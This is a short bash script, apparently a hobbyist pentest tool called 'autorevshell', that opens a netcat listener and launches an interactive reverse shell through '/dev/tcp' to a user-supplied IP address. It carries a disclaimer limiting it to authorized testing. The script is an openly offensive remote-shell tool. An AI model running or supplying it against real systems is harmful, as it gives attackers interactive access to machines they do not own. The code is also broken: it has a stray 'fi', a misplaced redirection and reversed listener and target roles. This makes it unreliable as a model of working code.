#!/bin/bash
echo "***************** autorevshell *******************"
echo "***** Copyright (C) 2022 lstn196 (author) ********"
echo "************** date: 03.28.2022  *****************"
#1. Automating a revshell ("bash -i" example)
#2. Function of choosing more types of reverse shells will be inserted
sleep 1
echo "
 _________________________________________________________
|                                                         |
| This script should be used for authorized penetration   |
| testing and/or educational purposes only. Any misuse    |
| of this software will not be the responsibility of the  |
| author or of any other collaborator. Use it at your own |
| networks and/or with the network owner's permission.    |
|_________________________________________________________|"
echo " "
echo "target's IP address:"
read -r IP
gnome-terminal -- nc -nlvp 1234
sleep 2
echo "launching reverse shell..."
sleep 0.5
gnome-terminal --  bash -i >& /dev/tcp/"$IP"/1234 0>&1
fi
